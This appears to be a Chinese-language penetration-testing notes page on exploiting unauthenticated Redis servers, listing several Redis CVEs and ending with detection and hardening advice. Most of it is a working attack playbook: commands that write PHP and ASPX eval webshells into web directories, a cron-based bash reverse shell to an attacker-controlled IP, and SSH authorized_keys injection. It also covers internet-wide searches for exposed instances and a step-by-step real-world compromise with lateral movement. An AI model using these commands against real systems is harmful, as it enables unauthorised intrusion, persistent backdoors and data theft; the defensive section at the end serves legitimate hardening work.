一些cve的poc和exp仅供自己测试业务使用 <br>
和记录一些攻击手段 对自己的业务的渗透测试 <br>
之后会整理成py脚本放进巡风里面 （正在做） <br>
因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis 服务器存储一些有趣的 session、cookie 或商业数据可以通过 get 枚举键值）。

也可以恶意执行 flushall 来清空所有数据，攻击者还可通过 EVAL 执行 Lua 代码，或通过数据备份功能往磁盘写入后门文件。

如果 Redis 以 root 身份运行，可以给 root 账户写入 SSH 公钥文件，直接免密码登录服务器，其相关漏洞信息如下：

Redis 远程代码执行漏洞(CVE-2016-8339)

Redis 3.2.x < 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis 数据结构存储的 CONFIG SET 命令中 client-output-buffer-limit 选项处理存在越界写漏洞。构造的 CONFIG SET 命令可导致越界写，代码执行。

CVE-2015-8080

Redis 2.8.x 在 2.8.24 以前和 3.0.x 在 3.0.6 以前版本，lua_struct.c 中存在 getnum 函数整数溢出，允许上下文相关的攻击者许可运行 Lua 代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。

CVE-2015-4335

Redis 2.8.1 之前版本和 3.0.2 之前 3.x 版本中存在安全漏洞。远程攻击者可执行 eval 命令利用该漏洞执行任意 Lua 字节码。

CVE-2013-7458

读取“.rediscli_history”配置文件信息。

Redis 攻击思路

内网端口扫描

nmap -v -n -Pn -p 6379 -sV --redis-info 192.168.56.1/24

通过文件包含读取其配置文件

Redis 配置文件中一般会设置明文密码，在进行渗透时也可以通过 webshell 查看其配置文件，Redis 往往不只一台计算机，可以利用其来进行内网渗透，或者扩展权限渗透。

使用 Redis 暴力破解工具

https://github.com/evilpacket/redis-sha-crack，其命令为：

node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555

需要安装 node：

git clone https://github.com/nodejs/node.git

chmod -R 755 node

cd node

./configure

make

msf 下利用模块

auxiliary/scanner/redis/file_upload normal Redis File Upload

auxiliary/scanner/redis/redis_login normal Redis Login Utility

auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner

Redis 漏洞利用

获取 webshell

当 Redis 权限不高时，并且服务器开着 Web 服务，在 Redis 有 Web 目录写权限时，可以尝试往 Web 路径写 webshell，前提是知道物理路径，精简命令如下：

config set dir E:/www/font

config set dbfilename redis2.aspx

set a "<%@ Page Language="J"%><%eval(Request.Item["c"],"unsafe");%>"

save

反弹 shell

连接 Redis 服务器

redis-cli –h

192.168.106.135 –p 6379

在 192.168.106.133 上执行

nc –vlp 7999

执行以下命令

set x "nn* * * * * bash -i >& /dev/tcp/192.168.106.133/7999 0>&1nn"

config set dir /var/spool/cron/

ubantu文件为：/var/spool/cron/crontabs/

config set dir /var/spool/cron/crontabs/

config set dbfilename root

save

免密码登录 SSH

ssh-keygen -t rsa

config set dir /root/.ssh/

config set dbfilename authorized_keys

set x "nnnssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZA3SEwRcvoYWXRkXoxu7BlmhVQz7Dd8H9ZFV0Y0wKOok1moUzW3+rrWHRaSUqLD5+auAmVlG5n1dAyP7ZepMkZHKWU94TubLBDKF7AIS3ZdHHOkYI8y0NRp6jvtOroZ9UO5va6Px4wHTNK+rmoXWxsz1dNDjO8eFy88Qqe9j3meYU/CQHGRSw0/XlzUxA95/ICmDBgQ7E9J/tN8BWWjs5+sS3wkPFXw1liRqpOyChEoYXREfPwxWTxWm68iwkE3/22LbqtpT1RKvVsuaLOrDz1E8qH+TBdjwiPcuzfyLnlWi6fQJci7FAdF2j4r8Mh9ONT5In3nSsAQoacbUS1lul root@kali2018nnn"

save




使用漏洞搜索引擎搜索

对“port: 6379”进行搜索

https://www.zoomeye.org/searchResult?q=port:6379

除去显示“-NOAUTH Authentication required.”的结果，显示这个信息表示需要进行认证，也即需要密码才能访问。

https://fofa.so/

关键字检索：port="6379" && protocol==redis && country=CN

Redis 账号获取 webshell 实战

扫描某目标服务器端口信息

通过 nmap 对某目标服务器进行全端口扫描，发现该目标开放 Redis 的端口为 3357，默认端口为 6379 端口，再次通过 iis put scaner 软件进行同网段服务器该端口扫描，如图 3 所示，获取两台开放该端口的服务器。



扫描同网段开放该端口的服务器

使用 telnet 登录服务器

使用命令“telnet ip port”命令登录，例如 telnet 1**.**.**.78 3357，登录后，输入 auth 和密码进行认证。

查看并保存当前的配置信息

通过“config get命令”查看 dir 和 dbfilename 的信息，并复制下来留待后续恢复使用。

ssh-keygen -t rsa

config get dir

config get dbfilename

配置并写入 webshell

设置路径

config set dir E:/www/font

设置数据库名称

将 dbfilename 对名称设置为支持脚本类型的文件，例如网站支持 PHP，则设置 file.php 即可，本例中为 aspx，所以设置 redis.aspx。

config set dbfilename redis.aspx

设置 webshell 的内容

根据实际情况来设置 webshell 的内容，webshell 仅仅为一个变量，可以是 a 等其他任意字符，下面为一些参考示例。

set webshell "<?php phpinfo(); ?>"

//php查看信息

set webshell "<?php @eval($_POST['chopper']);?> "

//phpwebshell

set webshell "<%@ Page Language="J"%><%eval(Request.Item["c"],"unsafe");%>"

// aspx的webshell，注意双引号使用"

保存写入的内容

save

查看 webshell 的内容

get webshell

完整过程执行命令如图 4 所示，每一次命令显示“+OK”表示配置成功。



：写入 webshell

测试 webshell 是否正常

在浏览器中输入对应写入文件的名字，如图5所示进行访问，出现类似：

“REDIS0006?webshell'a@H 搀???”则表明正确获取 webshell。



：测试 webshell 是否正常

获取 webshell

使用中国菜刀后门管理连接工具，成功获取该网站的 webshell。



图 6：获取 webshell

恢复原始设置

恢复 dir

config set dir dirname

恢复 dbfilename

config set dbfilename dbfilename

删除 webshell

del webshell

刷新数据库

flushdb

完整命令总结

telnet 1**.**.**.35 3357

auth 123456

config get dir

config get dbfilename

config set dir E:/www/

config set dbfilename redis2.aspx

set a "<%@ Page Language="J"%><%eval(Request.Item["c"],"unsafe");%>"

save

get a

查看 Redis 配置 conf 文件

通过 webshell，在其对应目录中发现还存在其他地址的 Redis，通过相同方法可以再次进行渗透，如图 7 所示，可以看到路径、端口、密码等信息。



查看 Redis 其配置文件

Redis 入侵检测和安全防范

入侵检测

检测 key

通过本地登录，通过“keys *”命令查看，如果有入侵则其中会有很多的值，如图 8 所示，在 keys * 执行成功后，可以看到有 trojan1 和 trojan2 命令，执行 get trojan1 即可进行查看。



检查 keys

Linux 下需要检查 authorized_keys

Redis 内建了名为 crackit 的 key，也可以是其他值，同时 Redis 的 conf 文件中 dir 参数指向了 /root/.ssh，/root/.ssh/authorized_keys 被覆盖或者包含 Redis 相关的内容，查看其值就可以知道是否被入侵过。

对网站进行 webshell 扫描和分析，发现利用 Redis 账号漏洞的，则在 shell 中会存在 Redis 字样。

对服务器进行后门清查和处理。

修复办法

禁止公网开放 Redis 端口，可以在防火墙上禁用 6379 Redis 的端口。
检查 authorized_keys 是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启 SSH 服务（service ssh restart）。
增加 Redis 密码验证。首先停止 Redis 服务，打开 redis.conf 配置文件（不同的配置文件，其路径可能不同）/etc/redis/6379.conf，找到 # # requirepass foobared 去掉前面的#号，然后将 foobared 改为自己设定的密码，重启启动 Redis 服务。
修改 conf 文件禁止全网访问，打开 6379.conf 文件，找到 bind0.0.0.0 前面加上#（禁止全网访问）。
可参考加固修改命令

port 修改redis使用的默认端口号

bind 设定redis监听的专用IP

requirepass 设定redis连接的密码

rename-command CONFIG ""　 ＃禁用CONFIG命令

rename-command info info2 #重命名info为info2
